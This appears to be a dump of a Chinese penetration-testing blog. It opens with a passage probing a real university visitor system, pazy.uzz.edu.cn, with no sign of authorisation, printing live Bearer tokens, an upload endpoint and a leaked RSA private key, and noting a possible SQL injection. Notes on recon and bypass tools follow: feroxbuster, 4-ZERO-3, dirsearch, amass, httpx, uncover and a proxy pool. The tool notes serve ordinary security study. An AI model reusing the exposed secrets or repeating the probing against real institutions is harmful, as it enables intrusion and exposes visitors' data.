上传的文件地址https://pazy.uzz.edu.cn/api/profile/avatar/2024/10/18/image/1729264045573.jpeg小程序地址https://pazy.uzz.edu.cn/visitorh5/#/pages/login 其中一个数据包的地址 123456789101112GET /api/order/visitInfo/getVisitList?pageSize=1&amp;pageNum=50 HTTP/1.1Host: pazy.uzz.edu.cnAuthorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImNlYTc2MWIzLTk4NjUtNDBhOS05NmI0LTU5OTZkZTZiNzQ4MCJ9.L79PKW0MDpzUzcOyOohEDCsLj3jQov2sCtl1CrnJsGRIE675O30qI1Mt0mxIMmoIGKW688LDKqxUA83zjWxYaQUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11) XWEB/11437 FlueAccept: */*Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://pazy.uzz.edu.cn/visitorh5/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive 文件上传地址 123456789101112131415161718192021POST /api/order/visitUserInfo/file HTTP/1.1Host: pazy.uzz.edu.cnContent-Length: 4684Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImNlYTc2MWIzLTk4NjUtNDBhOS05NmI0LTU5OTZkZTZiNzQ4MCJ9.L79PKW0MDpzUzcOyOohEDCsLj3jQov2sCtl1CrnJsGRIE675O30qI1Mt0mxIMmoIGKW688LDKqxUA83zjWxYaQUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11) XWEB/11437 FlueContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryAe90lmWqn7uL2D4EAccept: */*Origin: https://pazy.uzz.edu.cnSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://pazy.uzz.edu.cn/visitorh5/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive------WebKitFormBoundaryAe90lmWqn7uL2D4EContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1729264045573.jpg&quot;Content-Type: image/jpeg���� https://210.44.232.92/static/js/app.393c65f7.js这个目录泄露了公私钥的地址 12publickey:&quot;MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKoR8mX0rGKLqzcWmOzbfj64K8ZIgOdH\\nnzkXSOVOZbFu/TJhZ7rFAN+eaGkl3C4buccQd/EjEsj9ir7ijT7h96MCAwEAAQ==&quot;privatekey=&quot;MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAqhHyZfSsYourNxaY\\n7Nt+PrgrxkiA50efORdI5U5lsW79MmFnusUA355oaSXcLhu5xxB38SMSyP2KvuKN\\nPuH3owIDAQABAkAfoiLyL+Z4lf4Myxk6xUDgLaWGximj20CUf+5BKKnlrK+Ed8gA\\nkM0HqoTt2UZwA5E2MzS4EI2gjfQhz5X28uqxAiEA3wNFxfrCZlSZHb0gn2zDpWow\\ncSxQAgiCstxGUoOqlW8CIQDDOerGKH5OmCJ4Z21v+F25WaHYPxCFMvwxpcw99Ecv\\nDQIgIdhDTIqD2jfYjPTY8Jj3EDGPbH2HHuffvflECt3Ek60CIQCFRlCkHpi7hthh\\nYhovyloRYsM+IS9h/0BzlEAuO0ktMQIgSPT3aFAgJYwKpqRYKlLDVcflZFCKY7u3\\nUP8iWi1Qw0Y=&quot; 最后发现登陆后存在sql注入漏洞，但是奈何没有用户账号，所以没有办法验证","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"feroxbuster","slug":"feroxbuster","date":"2024-06-02T14:04:45.000Z","updated":"2024-11-09T10:19:18.506Z","comments":true,"path":"2024/06/02/feroxbuster/","permalink":"http://dale.us.kg/2024/06/02/feroxbuster/","excerpt":"","text":"✍内容项目地址https://github.com/epi052/feroxbuster 下载 Linux 123下载到当前的目录curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash Windows 123Invoke-WebRequest https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-windows-feroxbuster.exe.zip -OutFile feroxbuster.zipExpand-Archive .\\feroxbuster.zip.\\feroxbuster\\feroxbuster.exe -V kali 1sudo apt update &amp;&amp; sudo apt install -y feroxbuster 更新1./feroxbuster --update 注意事项 默认扫描比较野蛮，建议做一些限制 默认添加了 SecLists 字典 使用技巧过滤重定向 有时候会将网页重新定向到一个页面，那扫描结果就会很多，用以下命令过滤12./feroxbuster -u https://somesite.xyz --filter-similar-to https://somesite.xyz/register 更多技巧参考：【扫描工具】强制浏览-feroxbuster v2.10.1 字典整合版-CSDN博客 忽略不安全的ssl连接 有时候会显示ssl连接不安全啥的，就需要使用这个选项 -k 常用方法扫描目录 限制同时扫描两个目录，线程 20，排除状态码 404， 扫描目标&lt;url&gt;且仅扫描目录 1feroxbuster --scan-limit 2 -t 20 --filter-status 404 --url &lt;url&gt; 扫描java网站1feroxbuster -x html,htm,jsp --scan-limit 2 -t 20 --filter-status 404 --url &lt;url&gt; 扫描PHP网站1feroxbuster -x html,php --scan-limit 2 -t 20 --filter-status 404 --url &lt;url&gt; 扫描asp网站1feroxbuster -x html,asp --scan-limit 2 -t 20 --filter-status 404 --url &lt;url&gt;","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/fuzz","slug":"工具使用-fuzz","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-fuzz/"}]},{"title":"正方统一管理认证系统代码审计","slug":"正方统一管理认证系统代码审计","date":"2024-05-31T07:13:39.000Z","updated":"2024-11-11T01:16:42.761Z","comments":true,"path":"2024/05/31/正方统一管理认证系统代码审计/","permalink":"http://dale.us.kg/2024/05/31/%E6%AD%A3%E6%96%B9%E7%BB%9F%E4%B8%80%E7%AE%A1%E7%90%86%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"✍内容部署正方统一认证系统先安装Oracle数据库https://blog.csdn.net/weixin_44841225/article/details/100782269 根据这个文章一步步安装好数据库 数据库信息 12345678910111213创建新的Oracle用户：Oracleuser123456数据库文件地址D:\\environment\\oradatasys密码：1234Qwer!安装完成后会有一个登陆地址：https://localhost:5500/em/ 使用navicat连接oracle数据库新建连接，选择oracle，主机选择localhost，端口默认，服务名查看计算机服务中的是什么 然后选择高级，角色选择sysdba 踩坑可能连接失败的原因：oci版本不匹配 解决方法： 去这个网址下载对用版本的http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html 然后去navicat中的选项中的环境中更改成这个下载的oci.dll 详细参考：https://www.cnblogs.com/lrc123/p/15816179.html 导入数据库数据创建用户：zfsoft_zfim_new密码：123456 直接使用数据泵导入会报错，所以需要使用imp导入 格式 123imp 用户名/密码@服务名 file=&quot;文件路径地址&quot; full=y ignore=yimp sys/1234Qwer!@ODRL file=D:/environment/admin/odrl/dpdump/zfsoft_zfim_new.dmp full=y ignore=y 按照教程也不能部署😅，就到这里了，直接代码审计吧 判断框架 判断框架的意义在于快速熟悉项目的结构，方便接下来的审计 查看配置文件 查看项目结构 总共两个重要的文件夹：zfca和zfia 两个项目的功能如下 查看zfca的配置文件 由项目结构可以看出项目的框架有weblogic、spring、dwr 看到这我们还不知道持久层用的是什么框架 查看sql-map-config.xml文件 这个文件一看就是和sql有关的配置文件 发现ibatis框架 查看Userinfo.xml文件的内容 寻找SQL注入漏洞 既然这个是ibatis框架，那么只要在这个xml文件中搜索是否存在$$拼接的即可 文件中搜索$ 很可惜并没有","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"4-zero-3","slug":"4-zero-3","date":"2024-05-12T06:21:30.000Z","updated":"2024-11-09T10:19:18.384Z","comments":true,"path":"2024/05/12/4-zero-3/","permalink":"http://dale.us.kg/2024/05/12/4-zero-3/","excerpt":"","text":"✍内容项目地址https://github.com/Dheerajmadhukar/4-ZERO-3 4-ZERO-3 Tool to bypass 403&#x2F;401. This script contain all the possible techniques to do the sam 使用方法帮助bash 403-bypass.sh -h Usage &#x2F; Modes Scan with specific payloads: [ --header ] Support HEADER based bypasses&#x2F;payloads 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --header [ --protocol ] Support PROTOCOL based bypasses&#x2F;payloads 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --protocol [ --port ] Support PORT based bypasses&#x2F;payloads 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --port [ --HTTPmethod ] Support HTTP Method based bypasses&#x2F;payloads 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --HTTPmethod [ --encode ] Support URL Encoded bypasses&#x2F;payloads 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --encode [ --SQLi ] Support MySQL mod_Security &amp; libinjection bypasses&#x2F;payloads [** New **] 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --SQLi Complete Scan {includes all exploits&#x2F;payloads} for an endpoint [ –exploit ] 1root@me_dheeraj:$ bash 403-bypass.sh -u https://target.com/secret --exploit","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/403绕过","slug":"工具使用-403绕过","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-403%E7%BB%95%E8%BF%87/"}]},{"title":"代理池","slug":"代理池","date":"2024-05-11T09:11:55.000Z","updated":"2024-11-09T10:19:19.269Z","comments":true,"path":"2024/05/11/代理池/","permalink":"http://dale.us.kg/2024/05/11/%E4%BB%A3%E7%90%86%E6%B1%A0/","excerpt":"","text":"✍内容https://github.com/jhao104/proxy_poolhttps://github.com/safe6Sec/proxyServer Installing首先下载配置proxy_pool 1234567git clone https://github.com/jhao104/proxy_pool.gitcd proxy_poolpip3 install -r requirements.txt 然后因为项目需要用到redis，所以需要下载redis apt install redis 然后在项目中的setting.py中将redis连接的密码改成空密码 下载proxyServer https://github.com/safe6Sec/proxyServer/releases/download/v1.0/proxyServer.jar 使用方法 启动redis redis-server 启动proxy_pool 开启两个终端，启动如下的命令 123python3 proxyPool.py schedulepython3 proxyPool.py server 启动proxyServer 1java -jar proxyServer.jar 9090 然后使用各种工具的代理设置成127.0.0.1:9090就可以使用这个代理池了 但是免费的代理池并不好用，有时候根本连不上一个，所以需要自己添加代理 添加一个新的代理源方法如下: 1、首先在ProxyFetcher类中添加自定义的获取代理的静态方法， 该方法需要以生成器(yield)形式返回host:ip格式的代理，例如: 12345678910111213class ProxyFetcher(object): # .... # 自定义代理源获取方法 @staticmethod def freeProxyCustom1(): # 命名不和已有重复即可 # 通过某网站或者某接口或某数据库获取代理 # 假设你已经拿到了一个代理列表 proxies = [&quot;x.x.x.x:3128&quot;, &quot;x.x.x.x:80&quot;] for proxy in proxies: yield proxy # 确保每个proxy都是 host:ip正确的格式返回 2、添加好方法后，修改setting.py文件中的PROXY_FETCHER项： 在PROXY_FETCHER下添加自定义方法的名字: 123456PROXY_FETCHER = [ &quot;freeProxy01&quot;, &quot;freeProxy02&quot;, # .... &quot;freeProxyCustom1&quot; # # 确保名字和你添加方法名字一致] schedule 进程会每隔一段时间抓取一次代理，下次抓取时会自动识别调用你定义的方法。","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/代理池","slug":"工具使用-代理池","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E4%BB%A3%E7%90%86%E6%B1%A0/"}]},{"title":"dirsearch","slug":"dirsearch","date":"2024-05-11T07:13:41.000Z","updated":"2024-11-09T10:19:18.467Z","comments":true,"path":"2024/05/11/dirsearch/","permalink":"http://dale.us.kg/2024/05/11/dirsearch/","excerpt":"","text":"✍内容项目地址maurosoria&#x2F;dirsearch: Web path scanner (github.com) Installing直接下载源码配环境一大堆问题，如果是kali的话直接使用如下命令即可 1apt install dirsearch 使用方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125用法: dirsearch.py [-u|--url] 目标 [-e|--extensions] 扩展名 [选项] 选项: --version 显示程序版本号并退出 -h, --help 显示帮助信息并退出 必填项: -u URL, --url=URL 目标 URL(s)，可以使用多个标志 -l PATH, --url-file=PATH URL 列表文件 --stdin 从 STDIN 读取 URL(s) --cidr=CIDR 目标 CIDR --raw=PATH 从文件加载原始 HTTP 请求（使用 &#x27;--scheme&#x27; 标志设置协议） -s SESSION_FILE, --session=SESSION_FILE 会话文件 --config=PATH 配置文件的路径（默认使用 &#x27;DIRSEARCH_CONFIG&#x27; 环境变量，否则使用 &#x27;config.ini&#x27;） 字典设置: -w WORDLISTS, --wordlists=WORDLISTS 自定义字典（用逗号分隔） -e EXTENSIONS, --extensions=EXTENSIONS 用逗号分隔的扩展名列表（例如 php,asp） -f, --force-extensions 在每个字典条目的末尾添加扩展名。默认情况下，dirsearch 只用扩展名替换 %EXT% 关键字 -O, --overwrite-extensions 使用您的扩展名（通过 `-e` 选择）覆盖字典中的其他扩展名 --exclude-extensions=EXTENSIONS 用逗号分隔的扩展名列表排除（例如 asp,jsp） --remove-extensions 移除所有路径中的扩展名（例如 admin.php -&gt; admin） --prefixes=PREFIXES 添加自定义前缀到所有字典条目（用逗号分隔） --suffixes=SUFFIXES 添加自定义后缀到所有字典条目，忽略目录（用逗号分隔） -U, --uppercase 字典转为大写 -L, --lowercase 字典转为小写 -C, --capital 字典首字母大写 通用设置: -t THREADS, --threads=THREADS 线程数 -r, --recursive 递归爆破 --deep-recursive 对每个目录深度执行递归扫描（例如 api/users -&gt; api/) --force-recursive 对每个找到的路径执行递归爆破，不仅限于目录 -R DEPTH, --max-recursion-depth=DEPTH 最大递归深度 --recursion-status=CODES 递归扫描的有效状态代码，支持范围（用逗号分隔） --subdirs=SUBDIRS 扫描给定 URL[s]的子目录（用逗号分隔） --exclude-subdirs=SUBDIRS 在递归扫描期间排除以下子目录（用逗号分隔） -i CODES, --include-status=CODES 包括状态代码，用逗号分隔，支持范围（例如 200,300-399） -x CODES, --exclude-status=CODES 排除状态代码，用逗号分隔，支持范围（例如 301,500-599） --exclude-sizes=SIZES 通过大小（用逗号分隔）排除响应（例如 0B,4KB） --exclude-text=TEXTS 通过文本排除响应，可以使用多个标志 --exclude-regex=REGEX 通过正则表达式排除响应 --exclude-redirect=STRING 如果正则表达式（或文本）与重定向 URL 匹配，则排除响应（例如 &#x27;/index.html&#x27;） --exclude-response=PATH 排除类似于此页面响应的响应，以路径为输入（例如 404.html） --skip-on-status=CODES 每当命中其中一个状态代码时跳过目标，用逗号分隔，支持范围 --min-response-size=LENGTH 最小响应长度 --max-response-size=LENGTH 最大响应长度 --max-time=SECONDS 扫描的最大运行时间 --exit-on-error 每当发生错误时退出 请求设置: -m METHOD, --http-method=METHOD HTTP 方法（默认: GET） -d DATA, --data=DATA HTTP 请求数据 --data-file=PATH 包含 HTTP 请求数据的文件 -H HEADERS, --header=HEADERS HTTP 请求头，可以使用多个标志 --header-file=PATH 包含 HTTP 请求头的文件 -F, --follow-redirects 跟随 HTTP 重定向 --random-agent 为每个请求选择随机 User-Agent --auth=CREDENTIAL 身份验证凭证（例如 user:password 或 bearer token） --auth-type=TYPE 身份验证类型（basic, digest, bearer, ntlm, jwt, oauth2） --cert-file=PATH 包含客户端证书的文件 --key-file=PATH 包含客户端证书私钥的文件（未加密） --user-agent=USER_AGENT --cookie=COOKIE 连接设置: --timeout=TIMEOUT 连接超时 --delay=DELAY 请求之间的延迟 --proxy=PROXY 代理 URL（HTTP/SOCKS），可以使用多个标志 --proxy-file=PATH 包含代理服务器的文件 --proxy-auth=CREDENTIAL 代理身份验证凭证 --replay-proxy=PROXY 重放找到的路径时使用的代理 --tor 使用 Tor 网络作为代理 --scheme=SCHEME 原始请求的协议或 URL 中没有协议时使用的协议（默认: 自动检测） --max-rate=RATE 每秒的最大请求数 --retries=RETRIES 失败请求的重试次数 --ip=IP 服务器 IP 地址 --interface=NETWORK_INTERFACE 要使用的网络接口 高级设置: --crawl 在响应中爬取新路径 显示设置: --full-url 在输出中显示完整的 URL（在安静模式下自动启用） --redirects-history 显示重定向历史 --no-color 无彩色输出 -q, --quiet-mode 安静模式 输出设置: -o PATH, --output=PATH 输出文件 --format=FORMAT 报告格式（可用: simple, plain, json, xml, md, csv, html, sqlite） --log=PATH 日志文件 注意事项若是出现ssl证书错误，可以使用如下方法暂时解决 12I haven&#x27;t got a clear clue about how to fix it safely and completely, but it looks like the problem is not from the dirsearch code.Here&#x27;s my temporary solution for anyone who got same error there: echo &quot;CipherString=DEFAULT@SECLEVEL=1&quot; &gt;&gt; /etc/ssl/openssl.cnf (and turn it back to CipherString=DEFAULT@SECLEVEL=2 after scan, cuz the prior lowering the security level for SSL connection)","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/fuzz","slug":"工具使用-fuzz","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-fuzz/"}]},{"title":"amass","slug":"amass","date":"2024-04-29T03:04:00.000Z","updated":"2024-11-09T10:19:18.425Z","comments":true,"path":"2024/04/29/amass/","permalink":"http://dale.us.kg/2024/04/29/amass/","excerpt":"","text":"✍内容项目地址https://github.com/owasp-amass/amass/ OWASP Amass项目使用开源信息收集和主动侦测技术对攻击面和外部资产发现进行网络映射。主要是收集子域名和ip 下载https://github.com/owasp-amass/amass/releases/tag/v4.2.0 使用方法这个只有两个子命令了，enum和intel，其他三个子命令被分成了三个工具 https://github.com/owasp-amass/oam-tools 下载go install -v github.com&#x2F;owasp-amass&#x2F;oam-tools&#x2F;cmd&#x2F;...@master Tool Description oam_subs Analyze collected OAM assets oam_track Analyze collected OAM data to identify newly discovered assets oam_viz Analyze collected OAM data to generate files renderable as graph visualizations 高级使用 先是使用amass获取子域名 amass enum -d xx.edu.cn -dir amass4owasp 使用oam查看获取到的子域名 .&#x2F;oam_subs -names -d xx.edu.cn 使用httpx来探测存活以及信息.&#x2F;oam_subs -names -d xx.edu.cn | .&#x2F;httpx -sc -title -location 参考链接https://webcache.googleusercontent.com/search?q=cache:https://medium.com/@BrownBearSec/automated-and-continuous-recon-attack-surface-management-amass-track-and-db-fabcaffce3c3","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/owasp","slug":"工具使用-owasp","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-owasp/"}]},{"title":"httpx","slug":"httpx","date":"2024-04-25T13:48:51.000Z","updated":"2024-11-09T10:19:18.590Z","comments":true,"path":"2024/04/25/httpx/","permalink":"http://dale.us.kg/2024/04/25/httpx/","excerpt":"","text":"✍内容工具地址https://github.com/projectdiscovery/httpx 下载go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 命令参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153Flags:INPUT: -l, -list string input file containing list of hosts to process -rr, -request string file containing raw request -u, -target string[] input target host(s) to probePROBES: -sc, -status-code display response status-code -cl, -content-length display response content-length -ct, -content-type display response content-type -location display response redirect location -favicon display mmh3 hash for &#x27;/favicon.ico&#x27; file -hash string display response body hash (supported: md5,mmh3,simhash,sha1,sha256,sha512) -jarm display jarm fingerprint hash -rt, -response-time display response time -lc, -line-count display response body line count -wc, -word-count display response body word count -title display page title -bp, -body-preview display first N characters of response body (default 100) -server, -web-server display server name -td, -tech-detect display technology in use based on wappalyzer dataset (default true) -method display http request method -websocket display server using websocket -ip display host ip -cname display host cname -asn display host asn information -cdn display cdn/waf in use (default true) -probe display probe statusHEADLESS: -ss, -screenshot enable saving screenshot of the page using headless browser -system-chrome enable using local installed chrome for screenshot -ho, -headless-options string[] start headless chrome with additional options -esb, -exclude-screenshot-bytes enable excluding screenshot bytes from json output -ehb, -exclude-headless-body enable excluding headless header from json output -st, -screenshot-timeout int set timeout for screenshot in seconds (default 10)MATCHERS: -mc, -match-code string match response with specified status code (-mc 200,302) -ml, -match-length string match response with specified content length (-ml 100,102) -mlc, -match-line-count string match response body with specified line count (-mlc 423,532) -mwc, -match-word-count string match response body with specified word count (-mwc 43,55) -mfc, -match-favicon string[] match response with specified favicon hash (-mfc 1494302000) -ms, -match-string string match response with specified string (-ms admin) -mr, -match-regex string match response with specified regex (-mr admin) -mcdn, -match-cdn string[] match host with specified cdn provider (cloudfront, fastly, google, leaseweb, stackpath) -mrt, -match-response-time string match response with specified response time in seconds (-mrt &#x27;&lt; 1&#x27;) -mdc, -match-condition string match response with dsl expression conditionEXTRACTOR: -er, -extract-regex string[] display response content with matched regex -ep, -extract-preset string[] display response content matched by a pre-defined regex (url,ipv4,mail)FILTERS: -fc, -filter-code string filter response with specified status code (-fc 403,401) -fep, -filter-error-page filter response with ML based error page detection -fl, -filter-length string filter response with specified content length (-fl 23,33) -flc, -filter-line-count string filter response body with specified line count (-flc 423,532) -fwc, -filter-word-count string filter response body with specified word count (-fwc 423,532) -ffc, -filter-favicon string[] filter response with specified favicon hash (-ffc 1494302000) -fs, -filter-string string filter response with specified string (-fs admin) -fe, -filter-regex string filter response with specified regex (-fe admin) -fcdn, -filter-cdn string[] filter host with specified cdn provider (cloudfront, fastly, google, leaseweb, stackpath) -frt, -filter-response-time string filter response with specified response time in seconds (-frt &#x27;&gt; 1&#x27;) -fdc, -filter-condition string filter response with dsl expression condition -strip strips all tags in response. supported formats: html,xml (default html)RATE-LIMIT: -t, -threads int number of threads to use (default 50) -rl, -rate-limit int maximum requests to send per second (default 150) -rlm, -rate-limit-minute int maximum number of requests to send per minuteMISCELLANEOUS: -pa, -probe-all-ips probe all the ips associated with same host -p, -ports string[] ports to probe (nmap syntax: eg http:1,2-10,11,https:80) -path string path or list of paths to probe (comma-separated, file) -tls-probe send http probes on the extracted TLS domains (dns_name) -csp-probe send http probes on the extracted CSP domains -tls-grab perform TLS(SSL) data grabbing -pipeline probe and display server supporting HTTP1.1 pipeline -http2 probe and display server supporting HTTP2 -vhost probe and display server supporting VHOST -ldv, -list-dsl-variables list json output field keys name that support dsl matcher/filterUPDATE: -up, -update update httpx to latest version -duc, -disable-update-check disable automatic httpx update checkOUTPUT: -o, -output string file to write output results -oa, -output-all filename to write output results in all formats -sr, -store-response store http response to output directory -srd, -store-response-dir string store http response to custom directory -csv store output in csv format -csvo, -csv-output-encoding string define output encoding -j, -json store output in JSONL(ines) format -irh, -include-response-header include http response (headers) in JSON output (-json only) -irr, -include-response include http request/response (headers + body) in JSON output (-json only) -irrb, -include-response-base64 include base64 encoded http request/response in JSON output (-json only) -include-chain include redirect http chain in JSON output (-json only) -store-chain include http redirect chain in responses (-sr only) -svrc, -store-vision-recon-cluster include visual recon clusters (-ss and -sr only)CONFIGURATIONS: -config string path to the httpx configuration file (default $HOME/.config/httpx/config.yaml) -auth configure projectdiscovery cloud (pdcp) api key (default true) -r, -resolvers string[] list of custom resolver (file or comma separated) -allow string[] allowed list of IP/CIDR&#x27;s to process (file or comma separated) -deny string[] denied list of IP/CIDR&#x27;s to process (file or comma separated) -sni, -sni-name string custom TLS SNI name -random-agent enable Random User-Agent to use (default true) -H, -header string[] custom http headers to send with request -http-proxy, -proxy string http proxy to use (eg http://127.0.0.1:8080) -unsafe send raw requests skipping golang normalization -resume resume scan using resume.cfg -fr, -follow-redirects follow http redirects -maxr, -max-redirects int max number of redirects to follow per host (default 10) -fhr, -follow-host-redirects follow redirects on the same host -rhsts, -respect-hsts respect HSTS response headers for redirect requests -vhost-input get a list of vhosts as input -x string request methods to probe, use &#x27;all&#x27; to probe all HTTP methods -body string post body to include in http request -s, -stream stream mode - start elaborating input targets without sorting -sd, -skip-dedupe disable dedupe input items (only used with stream mode) -ldp, -leave-default-ports leave default http/https ports in host header (eg. http://host:80 - https://host:443 -ztls use ztls library with autofallback to standard one for tls13 -no-decode avoid decoding body -tlsi, -tls-impersonate enable experimental client hello (ja3) tls randomization -no-stdin Disable Stdin processingDEBUG: -health-check, -hc run diagnostic check up -debug display request/response content in cli -debug-req display request content in cli -debug-resp display response content in cli -version display httpx version -stats display scan statistic -profile-mem string optional httpx memory profile dump file -silent silent mode -v, -verbose verbose mode -si, -stats-interval int number of seconds to wait between showing a statistics update (default: 5) -nc, -no-color disable colors in cli outputOPTIMIZATIONS: -nf, -no-fallback display both probed protocol (HTTPS and HTTP) -nfs, -no-fallback-scheme probe with protocol scheme specified in input -maxhr, -max-host-error int max error count per host before skipping remaining path/s (default 30) -e, -exclude string[] exclude host matching specified filter (&#x27;cdn&#x27;, &#x27;private-ips&#x27;, cidr, ip, regex) -retries int number of retries -timeout int timeout in seconds (default 10) -delay value duration between each http request (eg: 200ms, 1s) (default -1ns) -rsts, -response-size-to-save int max response size to save in bytes (default 2147483647) -rstr, -response-size-to-read int max response size to read in bytes (default 2147483647) 高级使用使用shodan找到所有的子域名后使用如下的命令即可爆破字典中所有的子域名 字典格式如下 12art.FUZZbaowei.FUZZ 然后使用如下的命令 1cat &#x27;/home/dale/Desktop/sub_domain.txt&#x27; | sed &#x27;s/FUZZ/xx.edu.cn/g&#x27; | ./httpx -sc -title -location -t 100","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/projectdiscovery","slug":"工具使用-projectdiscovery","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-projectdiscovery/"}]},{"title":"uncover","slug":"uncover","date":"2024-04-25T12:11:34.000Z","updated":"2024-11-09T10:19:19.179Z","comments":true,"path":"2024/04/25/uncover/","permalink":"http://dale.us.kg/2024/04/25/uncover/","excerpt":"","text":"✍内容项目地址https://github.com/projectdiscovery/uncover 简介 uncover is a go wrapper using APIs of well known search engines to quickly discover exposed hosts on the internet. It is built with automation in mind, so you can query it and utilize the results with your current pipeline tools. Installation Instructionsuncover requires go1.20 to install successfully. Run the following command to get the repo - 1go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest 默认输出地址/root/go/bin/运行上面的下载命令就会将工具下载到这个目录中 provider configuration file address/root/.config/uncover/ Provider ConfigurationThe default provider configuration file should be located at $CONFIG/uncover/provider-config.yaml and has the following contents as an example. Note: API keys are required and must be configured before running uncover. 123456789101112131415161718192021222324252627282930shodan: - SHODAN_API_KEY_1 - SHODAN_API_KEY_2censys: - CENSYS_API_ID_1:CENSYS_API_SECRET_1 - CENSYS_API_ID_2:CENSYS_API_SECRET_2fofa: - FOFA_EMAIL_1:FOFA_KEY_1 - FOFA_EMAIL_2:FOFA_KEY_2quake: - QUAKE_TOKEN_1 - QUAKE_TOKEN_2hunter: - HUNTER_API_KEY_1 - HUNTER_API_KEY_2zoomeye: - ZOOMEYE_API_KEY_1 - ZOOMEYE_API_KEY_2netlas: - NETLAS_API_KEY_1 - NETLAS_API_KEY_2criminalip: - CRIMINALIP_API_KEY_1 - CRIMINALIP_API_KEY_2publicwww: - PUBLICWWW_API_KEY_1 - PUBLICWWW_API_KEY_2hunterhow: - HUNTERHOW_API_KEY_1 - HUNTERHOW_API_KEY_2 When multiple keys&#x2F;credentials are specified for same provider in the config file, random key will be used for each execution. 其他的参考官网即可 命令示例 这个工具如果没有指定引擎的话默认是使用shodan引擎 默认运行1echo &#x27;ssl:&quot;Uber Technologies, Inc.&quot;&#x27; | uncover 查询文件中的语句1uncover -q dorks.txt 1234cat dorks.txtssl:&quot;Uber Technologies, Inc.&quot;title:&quot;Grafana&quot; 利用多个引擎查询1echo jira | uncover -e shodan,censys,fofa,quake,hunter,zoomeye,netlas,criminalip 多个引擎使用不同的语句搜索1uncover -shodan &#x27;http.component:&quot;Atlassian Jira&quot;&#x27; -censys &#x27;services.software.product=`Jira`&#x27; -fofa &#x27;app=&quot;ATLASSIAN-JIRA&quot;&#x27; -quake &#x27;Jira&#x27; -hunter &#x27;Jira&#x27; -zoomeye &#x27;app:&quot;Atlassian JIRA&quot;&#x27; -netlas &#x27;jira&#x27; -criminalip &#x27;Jira&#x27; shodan快速识别IP端口以及漏洞查询echo 51.83.59.99&#x2F;24 | uncover 